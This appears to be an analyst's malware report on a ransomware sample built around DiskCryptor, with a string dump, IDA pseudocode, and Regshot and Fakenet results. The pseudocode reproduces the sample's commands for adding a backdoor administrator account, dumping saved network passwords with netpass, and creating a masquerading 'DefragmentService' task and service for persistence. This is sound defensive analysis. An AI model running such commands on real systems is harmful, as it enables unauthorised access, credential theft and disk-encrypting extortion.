+	.rsrc:48B512      -ats                  AES-Twofish-Serpent ciphers chain
+	.rsrc:48B58A               ======  Original data wipe settings:  ======
+	.rsrc:48B5FE      -dod_e                US DoD 5220.22-M (8-306./E)          (3 passes)
+	.rsrc:48B692      -dod                  US DoD 5220.22-M (8-306./E, C and E) (7 passes)
+	.rsrc:48B726      -g                    Gutmann mode                         (35 passes)
+	.rsrc:48B7BC   -decrypt [dev] [param]          Decrypt volume device
+	.rsrc:48B82A      -p  [password]        Get password from command line
+	.rsrc:48B89C      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48B8EA   -reencrypt [dev] [param]        Re-encrypt device with new parameters,
+	.rsrc:48B97A                                   parameters are equal to -encrypt
+	.rsrc:48B9FE   -format [dev] [param]           Format volume device with encryption,
+	.rsrc:48BA8C                                   parameters are equal to -encrypt
+	.rsrc:48BB10      -q                    Quick format
+	.rsrc:48BB5E      -fat                  Format to FAT file system
+	.rsrc:48BBC6      -fat32          
+	.rsrc:48BBEE        Format to FAT32 file system
+	.rsrc:48BC32      -exfat                Format to exFAT file system
+	.rsrc:48BC9E      -ntfs                 Format to NTFS file system
+	.rsrc:48BD08      -raw                  File system does not needed
+	.rsrc:48BD74   -enciso [src] [dst] [param]     Encrypt .iso image,
+	.rsrc:48BDDE                                   parameters are equal to -encrypt
+	.rsrc:48BE62      -src                  Source file
+	.rsrc:48BEAE      -dst                  Destination file
+	.rsrc:48BF04  ________________________________________________________________________________
+	.rsrc:48BFA8   -chpass [dev] [param]           Change volume password
+	.rsrc:48C018      -op  [password]       Get old password from command line
+	.rsrc:48C092      -np  [password]       Get new password from command line
+	.rsrc:48C10C      -okf [keyfiles path]  Old keyfiles
+	.rsrc:48C15A      -nkf [keyfiles path]  New keyfiles
+	.rsrc:48C1A8   -backup [dev] [file] [param]    Backup volume header to file
+	.rsrc:48C224      -p  [password]        Get password from command line
+	.rsrc:48C296      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48C2E4   -restore [dev] [file] [param]   Restore volume header from file
+	.rsrc:48C366      -p  [password]        Get password from command line
+	.rsrc:48C3D8      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48C426  ________________________________________________________________________________
+	.rsrc:48C4CA   -boot [action]
+	.rsrc:48C4EA      -enum                        Enumerate all HDDs
+	.rsrc:48C552      -config  [hdd/file]          Change bootloader configuration
+	.rsrc:48C5D4      -setmbr  [hdd] [opt]         Setup bootloader to HDD master boot record
+	.rsrc:48C66C      -updmbr  [hdd]               Update bootloader on HDD master boot record
+	.rsrc:48C706      -delmbr  [hdd]               Delete bootloader from HDD master boot record
+	.rsrc:48C7A4      -setpar  [root par] [opt]    Setup bootloader to bootable partition
+	.rsrc:48C834      -makeiso [file] [opt]        Make bootloader image (.iso)
+	.rsrc:48C8B0      -makepxe [file] [opt]        Make bootloader image for PXE network booting
+	.rsrc:48C94E         -small             Use small bootloader, only with AES
+	.rsrc:48C9CC  unmounted
+	.rsrc:48C9E0  mounted
+	.rsrc:48C9F0  unsupported
+	.rsrc:48CA08  , boot
+	.rsrc:48CA18  , system
+	.rsrc:48CA30  ------------------------------------------------------------------
+	.rsrc:48CAB6  volume |     mount point      |   size  |       status
+	.rsrc:48CB24  -------+----------------------+---------+-------------------------
+	.rsrc:48CBB0  pt%d    | %-20s | %-7s | %-23s
+	.rsrc:48CBF0  Confirm password: 
+	.rsrc:48CC18  The password was not correctly confirmed.
+	.rsrc:48CC70  None
+	.rsrc:48CC80  US DoD 5220.22-M (8-306. / E) (3 passes)
+	.rsrc:48CCD8  US DoD 5220.22-M (8-306. / E, C and E) (7 passes)
+	.rsrc:48CD3C  Gutmann (35 passes)
+	.rsrc:48CD68  Encrypting progress...
+	.rsrc:48CD96  Old data wipe mode: %s
+	.rsrc:48CDC6  Press ESC to cancel encrypting or press "W" to change wipe mode
+	.rsrc:48CE4A  Encryption cancelled
+	.rsrc:48CE7A  1 - None (fastest)
+	.rsrc:48CEA0  2 - US DoD 5220.22-M (8-306. / E) (3 passes)
+	.rsrc:48CEFA  3 - US DoD 5220.22-M (8-306. / E, C and E) (7 passes)
+	.rsrc:48CF66  4 - Gutmann (35 passes)
+	.rsrc:48CF9A  %-.3f %%
+	.rsrc:48CFAE  Encryption finished
+	.rsrc:48CFDA  Encryption error %d
+	.rsrc:48D008  Formatting progress...
+	.rsrc:48D036  Old data wipe mode: %s
+	.rsrc:48D066  Press ESC to cancel encrypting or press "W" to change wipe mode
+	.rsrc:48D0EA  Formatting cancelled
+	.rsrc:48D11A  Formatting error %d
+	.rsrc:48D148  Decrypting progress...
+	.rsrc:48D176  Press ESC to cancel decrypting
+	.rsrc:48D1BA  Decryption cancelled
+	.rsrc:48D1EA  Decryption finished
+	.rsrc:48D216  Decryption error %d
+	.rsrc:48D240  Not enough space after partitions to install bootloader.
+	.rsrc:48D2B2  Install bootloader to first HDD track (incompatible with third-party bootmanagers, like GRUB) Y/N?
+	.rsrc:48D38C  Enter password: 
+	.rsrc:48D400  -ats
+	.rsrc:48D40C  -dod_e
+	.rsrc:48D41C  -dod
+	.rsrc:48D430  Please use x64 version of DiskCryptor
+	.rsrc:48D480  Administrator privilegies required
+	.rsrc:48D4C8  -version
+	.rsrc:48D4E6  8DiskCryptor %S console
+	.rsrc:48D518  DiskCryptor 0.1-0.4 installed, please completely uninstall it before use this version
+	.rsrc:48D5C8  -boot
+	.rsrc:48D5D8  DiskCryptor is not installed,
+	.rsrc:48D614  please install DiskCryptor and reboot you system
+	.rsrc:48D678  DiskCryptor driver ver %d detected
+	.rsrc:48D6BE  Please use last program version
+	.rsrc:48D700  Old DiskCryptor driver detected
+	.rsrc:48D740  please update DiskCryptor and reboot you system
+	.rsrc:48D7A4  -info
+	.rsrc:48D7B0  Device:            %s
+	.rsrc:48D7DC  SymLink:           %s
+	.rsrc:48D808  Mount point:       %s
+	.rsrc:48D834  Capacity:          %s
+	.rsrc:48D860  Status:            %s
+	.rsrc:48D890  Cipher:            %s
+	.rsrc:48D8BC  Encryption mode:   XTS
+	.rsrc:48D8EA  Pkcs5.2 prf:       HMAC-SHA-512
+	.rsrc:48D92A  Encrypted portion: %-.3f%%
+	.rsrc:48D964  -mount
+	.rsrc:48D978  This device is already mounted
+	.rsrc:48D9B8  Invalid device state
+	.rsrc:48D9F0  device %s already have mount point
+	.rsrc:48DA40  Error when adding mount point
+	.rsrc:48DA80  device %s mounted
+	.rsrc:48DAA8  -mountall
+	.rsrc:48DABC  %d devices mounted
+	.rsrc:48DAE4  -unmount
+	.rsrc:48DB08  This device is not mounted
+	.rsrc:48DB40  This volume contains opened files.
+	.rsrc:48DB86  Would you like to force a unmount on this volume? (Y/N)
+	.rsrc:48DBF8  device %s unmounted
+	.rsrc:48DC24  -unmountall
+	.rsrc:48DC3C  all devices unmounted
+	.rsrc:48DC6C  -clean
+	.rsrc:48DC80  passwords has been erased in memory
+	.rsrc:48DCCC  -addpass
+	.rsrc:48DCE0  -encrypt
+	.rsrc:48DCF8  This device is already encrypted
+	.rsrc:48DD40  Your BIOS does not provide enough base memory, you can only use AES to encrypt the boot partition.
+	.rsrc:48DE08  This partition needed for system booting and bootable HDD not found
+	.rsrc:48DE90  You must be use external bootloader
+	.rsrc:48DED8  Continue operation (Y/N)?
+	.rsrc:48DF18   partition needed for system booting
+	.rsrc:48DF62  You must install bootloader to HDD, or use external bootloader
+	.rsrc:48DFE2  1 - Install to HDD
+	.rsrc:48E008  2 - I already have external bootloader
+	.rsrc:48E058  -decrypt
+	.rsrc:48E070  This device can not be decrypted because 'Deny access to unencrypted HDD's' option enabled.
+	.rsrc:48E12C  -reencrypt
+	.rsrc:48E148  This device is not complete encrypted
+	.rsrc:48E198  -chpass
+	.rsrc:48E1A8  Enter old password: 
+	.rsrc:48E1D4  -okf
+	.rsrc:48E1E8  Enter new password: 
+	.rsrc:48E214  -nkf
+	.rsrc:48E228  The password successfully changed
+	.rsrc:48E270  -format
+	.rsrc:48E280  This device is mounted, please unmount it
+	.rsrc:48E2E0  -ntfs
+	.rsrc:48E2EC  NTFS
+	.rsrc:48E2F8  -fat
+	.rsrc:48E30C  -fat32
+	.rsrc:48E31C  FAT32
+	.rsrc:48E328  -exfat
+	.rsrc:48E338  exFAT
+	.rsrc:48E344  Creating file system...
+	.rsrc:48E378  Formatting successfully completed.
+	.rsrc:48E3C0  -benchmark
+	.rsrc:48E3D8  ---------------------+--------------
+	.rsrc:48E422          cipher       |     speed
+	.rsrc:48E464  ---------------------+--------------
+	.rsrc:48E4B0   %-19s | %-.2f mb/s
+	.rsrc:48E4DC  -backup
+	.rsrc:48E4F0  Volume header backup successfully saved.
+	.rsrc:48E544  -restore
+	.rsrc:48E558  Please unmount device first
+	.rsrc:48E598  Volume header successfully restored.
+	.rsrc:48E5E4  non permitted
+	.rsrc:48E600  not available
+	.rsrc:48E620  0 - On/Off passwords caching (%s)
+	.rsrc:48E664  1 - On/Off hiding $dcsys$ files (%s)
+	.rsrc:48E6AE  2 - On/Off hardware cryptography support (%s)
+	.rsrc:48E70A  3 - On/Off automounting at boot time (%s)
+	.rsrc:48E75E  4 - On/Off optimization for SSD disks (%s)
+	.rsrc:48E7B4  5 - On/Off disable TRIM on encrypted SSD disks (%s)
+	.rsrc:48E81C  --------------------------------------------------
+	.rsrc:48E882  6 - On/Off Deny access to unencrypted removable devices (%s)
+	.rsrc:48E8FC  7 - On/Off Deny access to unencrypted HDD's (%s)
+	.rsrc:48E95E  8 - On/Off Deny access to unencrypted CDROM (%s)
+	.rsrc:48E9C0  --------------------------------------------------
+	.rsrc:48EA26  9 - Save changes and exit
+	.rsrc:48EA60  Configuration successfully saved
+	.rsrc:48EAA4  -keygen
+	.rsrc:48EAB4  -bsod
+	.rsrc:48EAC0  -enciso
+	.rsrc:48EAD0  ISO image successfully encrypted.
+	.rsrc:48EB18  Error: %d
+	.rsrc:48FBE6  VS_VERSION_INFO
+	.rsrc:48FC42  StringFileInfo
+	.rsrc:48FC66  000904b0
+	.rsrc:48FC7E  FileDescription
+	.rsrc:48FCA0  DiskCryptor console
+	.rsrc:48FCCE  FileVersion
+	.rsrc:48FCE8  1.1.846.118
+	.rsrc:48FD06  LegalCopyright
+	.rsrc:48FD24  http://diskcryptor.net/
+	.rsrc:48FD5A  OriginalFilename
+	.rsrc:48FD7C  dccon.exe
+	.rsrc:48FD96  ProductName
+	.rsrc:48FDB0  DiskCryptor
+	.rsrc:48FDCE  ProductVersion
+	.rsrc:48FDFA  VarFileInfo
+	.rsrc:48FE1A  Translation
+	.rsrc:490F9B  <<<Obsolete>>
+	.rsrc:4AAA93  jjjj
+	.rsrc:4AAAC0  jjjjh
+	.rsrc:4AAB0A  jjjj
+	.rsrc:4AC048  jjjj
+	.rsrc:4ADE93  jjh 
+	.rsrc:4AF504  EXEFILE
+	.rsrc:4AF514  DISKCRYPTOR_MUTEX
+	.rsrc:4AF538  Removable Medium %d
+	.rsrc:4AF560  Hard disk %d
+	.rsrc:4AF57C  Optical drive %d
+	.rsrc:4AF5A0  \\.\dcrypt
+	.rsrc:4AF5B8  \\.\TcWde
+	.rsrc:4AF5CC  \??\Volume%s
+	.rsrc:4AF5E8  \ArcName\multi(0)disk(0)rdisk(0)partition(1)
+	.rsrc:4B53C8  dcrypt
+	.rsrc:4B53D8  dcrypt.sys
+	.rsrc:4B53F0  DiskCryptor driver
+	.rsrc:4B5418  SYSTEM\CurrentControlSet\Services\dcrypt\config
+	.rsrc:4B5478  SYSTEM\CurrentControlSet\Control\Class\{71A27CDD-812A-11D0-BEC7-08002BE2092F}
+	.rsrc:4B5518  SYSTEM\CurrentControlSet\Control\Class\{4D36E965-E325-11CE-BFC1-08002BE10318}
+	.rsrc:4B55B8  SYSTEM\CurrentControlSet\Control\CrashControl
+	.rsrc:4B5638  Flags
+	.rsrc:4B5644  sysBuild
+	.rsrc:4B5658  Hotkeys
+	.rsrc:4B5668  %s\drivers\%s
+	.rsrc:4B5684  FltMgr
+	.rsrc:4B5694  Filter
+	.rsrc:4B56A8  SYSTEM\CurrentControlSet\Services\dcrypt\Instances
+	.rsrc:4B5710  dcrypt
+	.rsrc:4B5720  DefaultInstance
+	.rsrc:4B5740  87150
+	.rsrc:4B574C  Altitude
+	.rsrc:4B5760  LowerFilters
+	.rsrc:4B577C  UpperFilters
+	.rsrc:4B5798  DumpFilters
+	.rsrc:4B57B0  dc_fsf.sys
+	.rsrc:4B57C8  DC_UPD_%d
+	.rsrc:4B57DC  %s\*
+	.rsrc:4B57E8  %s\%s
+	.rsrc:4B5836  N\\.\GLOBALROOT\ArcName\multi(0)disk(0)rdisk(0)partition(1)
+	.rsrc:4B58B0  FAT32
+	.rsrc:4B58BC  \\.\%c:
+	.rsrc:4B58CC  AES-Twofish-Serpent
+	.rsrc:4B58F4  Serpent-AES
+	.rsrc:4B590C  Twofish-Serpent
+	.rsrc:4B592C  AES-Twofish
+	.rsrc:4B5944  Serpent
+	.rsrc:4B5954  Twofish
+	.rsrc:4B59C4  \\.\PhysicalDrive%d
+	.rsrc:4B59EC  \\.\CdRom%d
+	.rsrc:4B5A04  %d bytes
+	.rsrc:4B5A18  %%-.%df %%cB
+	.rsrc:4B5A34  fmifs
+	.rsrc:4B6938   !"#$%&'()*+,-./0123456789:;<=>?@AB
+	.rsrc:4B756A  EXEFILE
+	.rsrc:4BFFDE  VS_VERSION_INFO
+	.rsrc:4C003A  StringFileInfo
+	.rsrc:4C005E  000904b0
+	.rsrc:4C0076  FileDescription
+	.rsrc:4C0098  DiskCryptor api
+	.rsrc:4C00BE  FileVersion
+	.rsrc:4C00D8  1.1.846.118
+	.rsrc:4C00F6  LegalCopyright
+	.rsrc:4C0114  http://diskcryptor.net/
+	.rsrc:4C014A  OriginalFilename
+	.rsrc:4C016C  dcapi.dll
+	.rsrc:4C0186  ProductName
+	.rsrc:4C01A0  DiskCryptor
+	.rsrc:4C01BE  ProductVersion
+	.rsrc:4C01EA  VarFileInfo
+	.rsrc:4C020A  Translation
+	.rsrc:4E1FE3  jjjjj
+	.rsrc:4F2CCC  mscoree.dll
+	.rsrc:4F2E08  R6008
+	.rsrc:4F2E16  - not enough space for arguments
+	.rsrc:4F2E60  R6009
+	.rsrc:4F2E6E  - not enough space for environment
+	.rsrc:4F2EB8  R6010
+	.rsrc:4F2EC6  - abort() has been called
+	.rsrc:4F2F00  R6016
+	.rsrc:4F2F0E  - not enough space for thread data
+	.rsrc:4F2F58  R6017
+	.rsrc:4F2F66  - unexpected multithread lock error
+	.rsrc:4F2FB8  R6018
+	.rsrc:4F2FC6  - unexpected heap error
+	.rsrc:4F3000  R6019
+	.rsrc:4F300E  - unable to open console device
+	.rsrc:4F3058  R6024
+	.rsrc:4F3066  - not e
+	.rsrc:4F3076  ough space for _onexit/atexit table
+	.rsrc:4F30C8  R6025
+	.rsrc:4F30D6  - pure virtual function call
+	.rsrc:4F3118  R6026
+	.rsrc:4F3126  - not enough space for stdio initialization
+	.rsrc:4F3188  R6027
+	.rsrc:4F3196  - not enough space for lowio initialization
+	.rsrc:4F31F8  R6028
+	.rsrc:4F3206  - unable to initialize heap
+	.rsrc:4F3244  R6030
+	.rsrc:4F3252  - CRT not initialized
+	.rsrc:4F3288  R6031
+	.rsrc:4F3296  - Attempt to initialize the CRT more than once.
+	.rsrc:4F32F6  This indicates a bug in your application.
+	.rsrc:4F3350  R6032
+	.rsrc:4F335E  - not enough space for locale information
+	.rsrc:4F33B8  R6033
+	.rsrc:4F33C6  - Attempt to use MSIL code from this assembly during native code initialization
+	.rsrc:4F3466  This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.
+	.rsrc:4F35A8  R6034
+	.rsrc:4F35B6  - inconsistent onexit begin-end variables
+	.rsrc:4F3610  DOMAIN error
+	.rsrc:4F3630  SING error
+	.rsrc:4F364C  TLOSS error
+	.rsrc:4F3670  runtime error 
+	.rsrc:4F3746  3R6002
+	.rsrc:4F3756  - floating point support not loaded
+	.rsrc:4F37A4  Runtime Error!
+	.rsrc:4F37C4  Program: 
+	.rsrc:4F37D8  <program name unknown>
+	.rsrc:4F3818  Microsoft Visual C++ Runtime Library
+	.rsrc:4F386C  (null)
+	.rsrc:4F38DC  kernel32.dll
+	.rsrc:4F3B6E  3ja-JP
+	.rsrc:4F3B7C  zh-CN
+	.rsrc:4F3B88  ko-KR
+	.rsrc:4F3B94  zh-TW
+	.rsrc:4F3DA4  Sunday
+	.rsrc:4F3DB4  Monday
+	.rsrc:4F3DC4  Tuesday
+	.rsrc:4F3DD4  Wednesday
+	.rsrc:4F3DE8  Thursday
+	.rsrc:4F3DFC  Friday
+	.rsrc:4F3E0C  Saturday
+	.rsrc:4F3E80  January
+	.rsrc:4F3E90  February
+	.rsrc:4F3EA4  March
+	.rsrc:4F3EB0  April
+	.rsrc:4F3EBC  June
+	.rsrc:4F3EC8  July
+	.rsrc:4F3ED4  August
+	.rsrc:4F3EE4  September
+	.rsrc:4F3EF8  October
+	.rsrc:4F3F08  November
+	.rsrc:4F3F1C  December
+	.rsrc:4F3F40  MM/dd/yy
+	.rsrc:4F3F54  dddd, MMMM dd, yyyy
+	.rsrc:4F3F7C  HH:mm:ss
+	.rsrc:4F3F90  en-US
+	.rsrc:4F4028  UTF-8
+	.rsrc:4F4034  UTF-16LE
+	.rsrc:4F4048  UNICODE
+	.rsrc:4F40EC  USER32.DLL
+	
+	.rsrc:5EB768  CONOUT$
+	.rsrc:5EB800  SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+	.rsrc:5EB898  DFServerService.exe
+	
+Code Review (-- Used IDA):
+	Set ___security_cookie as dd 0BB40E64Eh
+	saved_cookie = 0BB40E64Eh ^ ((esp & 0FFFFFFF8h) - 428h)  #saved_cookie is [esp+428h+var_4] , ^ is XOR
+	If argc(count of command-line arguments) < 2:
+		"Password not set.exit" ; exit
+	Else:
+		Hides the Console Window,
+		Loads argv, fetches argv[1]
+		edx is loaded with a 48 byte memory area
+		
+		strcpy(edx, ecx)
+		srccpy(MultiByteStr,argv[1])
+		
+		result = sub_401BF0();
+		
+		if (result!=0):
+			if (FilePathExists("C:\\DC22\\netpass.txt")):
+				goto label_sample_service
+			else:
+				print("getting share drive information")
+				net user mythbusters /add 123456
+				net user localgroup administrators mythbusters /add
+				cmd /c net use > > C:\\DC22\\netuse.txt
+		else:
+			if (FilePathExists("C:\\DC22\\netpass.txt")):
+				goto label_sample_service
+			else:
+				print("getting share drive information")
+				schtasks /create /tn DefragmentService /TR "cmd /c net use > > C:\\DC22\\netuse.txt" /sc DAILY
+				Sleep(0FA0h)
+				schtasks /run /TN DefragmentService 
+				Sleep(3E8h)
+				schtasks /delete /TN DefragmentService /F
+		
+		C:\\DC22\\netpass.exe /stab C:\\DC22\\netpass.txt
+		
+		label_sample_service:
+			Sleep(2710h)
+			ServiceTableEntryW ServiceStartTable
+			ServiceStartTable.lpServiceName = "My Sample Service"
+			ServiceStartTable.lpServiceProc = sub_4024F0()
+			var_420 = 0
+			var_41C = 0
+			
+			if(!StartServiceCtrlDispacherW):
+				print("Trying to create a service")
+				GetModuleFileNameW(NULL, Filename, 0x104);
+				LPCWTSR commandLine = GetCommandLineW()
+				if(wcsstr(commandLine,".exe")==NULL):
+					edx = wcsstr(esi, ".EXE") #return type of wcsstr is wchar_t
+				edi = &Filename
+				edx = edx - 2 # 2 = sizeof(wchar_t)
+				
+				while(Filename[i]!='\0')
+					i++
+				Filename[i] = ' ';
+				FIlename[i+1] = '\0';
+				
+				esi = edx + 0x0A;
+				
+				while(*(WCHAR *)edx !='\0'):
+					edx+=2
+				
+				WCHAR* filename = Filename;
+				size_t cmdlineBytes = (BYTE*)edx - (BYTE*)esi;
+				edi = (BYTE*)Filename - 2;
+				
+				WCHAR* p = Filename;
+				while(*p!='\0')
+					p++
+				
+				memcpy(destination, source, edx);
+				
+				SC_HANDLE hSCM = OpenSCManagerW(lpMachineName,NULL,0xF003F);
+				
+				if(hSCM==NULL or sub_4021A0(hSCM,Filename)==0):
+					DWORD error = GetLastError()
+					_security_check_cookie(saved_cookie^ESP) #where, saved_cookie=0xBB40E64E^ESP
+					return
+				
+				print("Creating service. rebooting windows.")
+				sub_402100()
+				
+			_security_check_cookie(saved_cookie^ESP);
+			return 0;
+
+Helper Functions:
+
+void sub_401B40(uint8_t *obj)
+{
+*(uint32_t *)obj = (uint32_t)&unk_426488;
+
+const uint32_t offsets[] = {
+    0x08, 0x0C, 0x10, 0x14, 0x18, 0x1C, 0x20, 0x24,
+    0x30, 0x34, 0x38, 0x3C, 0x40, 0x44, 0x54,
+    0x88, 0x8C, 0x90, 0x98, 0x9C
+};
+
+for (int i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
+    *(uint32_t *)(obj + offsets[i]) = 0;
+
+return;
+
+}
+
+function sub_4024F0():
+    print("ServiceMain: Entry")
+
+    statusHandle = RegisterServiceCtrlHandler(
+        "My Sample Service",
+        HandlerProc
+    )
+
+    if statusHandle == NULL:
+        print("Failed to register service handler")
+        return
+
+    ServiceStatus = {
+        type: SERVICE_WIN32_OWN_PROCESS,
+        controlsAccepted: 0,
+        state: SERVICE_START_PENDING,
+        exitCode: 0
+    }
+    SetServiceStatus(statusHandle, ServiceStatus)
+
+    stopEvent = CreateEvent(manualReset=true, initialState=false)
+
+    if stopEvent == NULL:
+        ServiceStatus.state = SERVICE_STOPPED
+        ServiceStatus.exitCode = GetLastError()
+        SetServiceStatus(statusHandle, ServiceStatus)
+        return
+
+    ServiceStatus.controlsAccepted = SERVICE_ACCEPT_STOP
+    ServiceStatus.state = SERVICE_RUNNING
+    SetServiceStatus(statusHandle, ServiceStatus)
+
+    worker = CreateThread(StartAddress)
+
+    print("Waiting for worker thread...")
+    WaitForSingleObject(worker, INFINITE)
+
+    CloseHandle(stopEvent)
+
+    ServiceStatus.controlsAccepted = 0
+    ServiceStatus.state = SERVICE_STOPPED
+    ServiceStatus.exitCode = 0
+    SetServiceStatus(statusHandle, ServiceStatus)
+
+    print("ServiceMain: Exit")
+
+
+FUNCTION sub_402100():
+
+    tokenHandle = NULL
+
+    IF NOT OpenProcessToken(
+        GetCurrentProcess(),
+        0x28,                    // DesiredAccess
+        &tokenHandle
+    ):
+        RETURN 0
+
+    newState.PrivilegeCount = 1
+    newState.Privileges.Attributes = 2  // SE_PRIVILEGE_ENABLED
+
+    LookupPrivilegeValueW(
+        NULL,
+        "SeShutdownPrivilege",
+        &newState.Privileges.Luid
+    )
+
+    AdjustTokenPrivileges(
+        tokenHandle,
+        FALSE,
+        &newState,
+        0,
+        NULL,
+        NULL
+    )
+
+    IF GetLastError() != 0:
+        RETURN 0
+
+    RETURN ExitWindowsEx(
+        6,                       // EWX_LOGOFF | EWX_POWEROFF
+        0x80020003               // shutdown reason
+    )
+
+
+function sub_415CB2(outputString, messageText, flags):
+    packaged = __crtIsPackagedApp()
+
+    # Initialize USER32 APIs once
+    if dword_42BA1C == 0:
+        hUser32 = LoadLibraryExW("USER32.DLL", NULL, 0x800)
+        if hUser32 == NULL:
+            if GetLastError() != 0x57:
+                return 0
+            hUser32 = LoadLibraryW("USER32.DLL")
+            if hUser32 == NULL:
+                return 0
+
+        p = GetProcAddress(hUser32, "MessageBoxW")
+        if p == NULL:
+            return 0
+        dword_42BA1C = EncodePointer(p)
+
+        dword_42BA20 = EncodePointer(
+            GetProcAddress(hUser32, "GetActiveWindow"))
+        dword_42BA24 = EncodePointer(
+            GetProcAddress(hUser32, "GetLastActivePopup"))
+        dword_42BA2C = EncodePointer(
+            GetProcAddress(hUser32, "GetUserObjectInformationW"))
+
+        if dword_42BA2C != 0:
+            dword_42BA28 = EncodePointer(
+                GetProcAddress(hUser32, "GetProcessWindowStation"))
+
+    if IsDebuggerPresent():
+        if outputString != NULL:
+            OutputDebugStringW(outputString)
+        if packaged:
+            return 4
+    elif packaged:
+        return DecodePointer(dword_42BA1C)
+
+    owner = NULL
+
+    # Determine owner window from the process window station
+    if DecodePointer(dword_42BA28) != NULL &&
+       DecodePointer(dword_42BA2C) != NULL:
+
+        station = DecodePointer(dword_42BA28)()
+        if station != NULL:
+            if !DecodePointer(dword_42BA2C)(
+                    station, 1, &var_10, 0xC, &var_24) ||
+               (var_8 & 1):
+                flags |= 0x200000
+                goto SHOW
+
+    # Otherwise use the last active popup
+    p = DecodePointer(dword_42BA20)
+    if p != NULL:
+        owner = p()
+
+        if owner != NULL:
+            p = DecodePointer(dword_42BA24)
+            if p != NULL:
+                owner = p(owner)
+
+SHOW:
+    p = DecodePointer(dword_42BA1C)
+    if p == NULL:
+        return 0
+
+    return p(owner, messageText, outputString, flags)
+
+Dynamic Analysis Observations:
+	The program executes successfully only if the program is launched from an administator cmd with a password provided as cmdline argument
+	- There is no C2 connection attempt observed in fakenet
+	- The logs start to print on the console
+	- A console window pops up, then closes
+	- The System reboots
+	- After the reboot, the system is noticebly slow
+	- Upon inspecting the Task Manager, we find that the Disk utilization is 100%
+	- The highest disk consumption is by System
+		- If the whole of the disk is consumed, the system crashes
+		- However, if the DiskCryptor console process is terminated from Task Manager, the disk utilization stabilizes and achieves normal value
+	- Either way, upon booting the system again, we see the ransom note.
+	- Also, the OS seems to be missing.
+
+Registry Changes (-- Used Regshot):
+
+Executive Summary - The Regshot comparison captures the registry state immediately before and after execution during 04-Oct-2026 14:51:50–15:01:06 on DESKTOP-O7TJ5FN, under user Analyst.
+
+The most significant change is the creation of a new Windows service named DefragmentService. The service is configured for automatic startup, executes the binary C:\Users\Analyst\Desktop\Ransomware\131.exe, and runs as LocalSystem. This provides the executable with a persistent, highly privileged execution mechanism and is the clearest security-relevant registry modification in the comparison.
+
+The service name is also notable because it closely resembles the legitimate Windows Defragmenter (defragsvc) service, suggesting possible masquerading. The legitimate defragsvc service remains associated with svchost.exe, whereas the newly created DefragmentService points directly to 131.exe.
+
+Regshot recorded a very large number of total registry changes—35,843 keys added, 1,305 deleted, 104,697 values added, 2,002 deleted, and 549 modified. Much of this activity appears related to Windows AppModel, Microsoft Store/DesktopAppInstaller, WinGet, packaged applications, and normal Windows background activity. Therefore, the raw change count should not be interpreted as equivalent to malicious registry activity.
+
+Timeline
+
+| Time                           | Event / Observation                                                                                                             |
+| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
+| **04-Oct-2026 14:51:50**       | Regshot **before** snapshot captured on `DESKTOP-O7TJ5FN` under `Analyst`.                                                      |
+| **14:51:50–15:01:06**          | Execution/activity window represented by the before/after comparison.                                                           |
+| **During execution window**    | Large-scale Windows registry activity occurred, including AppModel, Store, WinGet and other system/application changes.         |
+| **During execution window**    | A new Windows service registry configuration named **`DefragmentService`** was created.                                         |
+| **After execution / 15:01:06** | Regshot **after** snapshot captured. The new service configuration was present in both `ControlSet001` and `CurrentControlSet`. |
+
+Major Noticeable Registry Changes
+
+| Registry Change                             | Observed After State                                                     | Security Significance                                                                       |
+| ------------------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------- |
+| **New service: `DefragmentService`**        | `HKLM\SYSTEM\CurrentControlSet\Services\DefragmentService`               | **High** — new persistence mechanism                                                        |
+| **Service startup**                         | `Start = 0x2`                                                            | **High** — configured for automatic startup                                                 |
+| **Service executable**                      | `ImagePath = C:\Users\Analyst\Desktop\Ransomware\131.exe  123456`        | **Critical/High** — directly executes the analyzed binary                                   |
+| **Service account**                         | `ObjectName = LocalSystem`                                               | **High** — execution with SYSTEM-level privileges                                           |
+| **Service type**                            | `Type = 0x10`                                                            | Windows Win32 service                                                                       |
+| **Failure actions**                         | `FailureActions` configured                                              | Indicates service recovery behavior is configured                                           |
+| **Service display name**                    | `DefragmentService`                                                      | Suspicious masquerading potential                                                           |
+| **Duplicate control-set entry**             | Same service under `ControlSet001`                                       | Consistent with Windows service configuration being written to the system configuration     |
+| **Normal `defragsvc`**                      | Legitimate service uses `%SystemRoot%\system32\svchost.exe -k defragsvc` | Helps distinguish the newly created `DefragmentService` from the legitimate Windows service |
+| **Run / RunOnce**                           | No obvious malicious new entry identified                                | No evidence of conventional Run-key persistence                                             |
+| **Winlogon / IFEO / AppInit / BootExecute** | No obvious malicious modification identified                             | No additional conventional persistence mechanism observed                                   |
+
+Key Finding: DefragmentService
+
+The most important registry modification is:
+HKLM\SYSTEM\CurrentControlSet\Services\DefragmentService
+
+Type        = 0x00000010
+Start       = 0x00000002
+ImagePath   = "C:\Users\Analyst\Desktop\Ransomware\131.exe  123456"
+DisplayName = "DefragmentService"
+ObjectName  = "LocalSystem"
+
+The same service configuration was also observed under: HKLM\SYSTEM\ControlSet001\Services\DefragmentService
+
+This means the executable established a persistent Windows service rather than merely executing as a one-time user process.
+
+Network Activity (-- Used Fakenet):
+No Noticeable Network Activity by the Ransomware
